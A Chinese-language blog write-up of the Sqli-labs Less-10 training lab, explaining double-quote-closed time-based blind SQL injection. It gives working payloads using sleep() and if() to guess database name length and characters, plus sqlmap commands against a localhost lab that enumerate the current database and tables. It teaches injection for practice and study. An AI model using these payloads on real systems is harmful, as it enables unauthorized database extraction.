---
title: Sqli-labs Less-10 Writeup
date: 2026-11-16
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---
## 题目描述
本关卡为 **基于双引号闭合的时间盲注（Time-based Blind SQL Injection）**。
页面表现与 Less-9 完全一致，输入任何 `id` 永远只返回 `You are in...........`。无回显、无报错、无布尔状态差异。
如果按照 Less-9 的套路去打，你会发现单引号 `'` 无法触发延迟，因为这里的后端 SQL 语句使用的是双引号包裹。

## 解题思路
1. **测试闭合符号**：既然单引号不行，尝试双引号。输入 `?id=1" and sleep(5) --+`，如果页面卡顿 5 秒，说明双引号 `"` 闭合成功。
2. **结合 `if()` 函数构造盲注语句**：
   原理与 Less-9 相同，只是把闭合符号换成了双引号 `"`。
   - 长度判断：`?id=1" and if(length(database())=8,sleep(3),1) --+`
   - 字符猜解：`?id=1" and if(ascii(substr(database(),1,1))>100,sleep(3),1) --+`
3. **使用 SQLMap 自动化**：实战中时间盲注的纯手工测试极其消耗精力和时间，直接上工具是最优解。

> 知识点：很多开发者以为把单引号换成双引号就安全了，或者有些代码规范强制使用双引号。Less-10 告诉我们，只要没有使用预编译（Prepared Statements），换什么引号都会存在 SQL 注入漏洞。

## 通关 Payload (手工测试)

### 1. 测试延时闭合（页面卡 5 秒）
```sql
?id=1" and sleep(5) --+
```

### 2. 猜解数据库名长度（如果库名是 8 位，页面卡 3 秒）

```sql
?id=1" and if(length(database())=8,sleep(3),1) --+
```

### 3. 猜解数据库名首字母（ASCII 码大于 100 则卡 3 秒）

```sql
?id=1" and if(ascii(substr(database(),1,1))>100,sleep(3),1) --+
```

---

## 自动化工具通关

```bash
# 爆当前库名
sqlmap -u "http://localhost/sqli-labs-master/Less-10/?id=1" --technique T --time-sec 3 --batch --current-db

# 爆表名
sqlmap -u "http://localhost/sqli-labs-master/Less-10/?id=1" --technique T --time-sec 3 --batch -D security --tables
```

```
